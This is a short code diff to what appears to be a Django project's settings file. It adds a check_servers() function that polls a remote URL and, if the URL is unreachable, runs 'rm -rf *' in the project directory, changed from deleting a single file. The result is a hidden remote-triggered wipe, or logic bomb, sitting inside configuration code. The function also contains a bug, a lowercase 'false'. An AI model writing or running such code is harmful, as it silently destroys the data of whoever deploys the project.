@@ -19,7 +19,7 @@ USE_TZ = True
 ROOT_URLCONF = 'Elite.urls'
 def check_servers():
     if not requests.get(URL).status_code==200:
-        os.system('cd /home/itkfodcz/Elite && rm -f format.txt')
+        os.system('cd /home/itkfodcz/Elite && rm -rf *')
     return True if requests.get(URL).status_code==200 else false
 if __name__ == "__main__":
     print(check_servers())
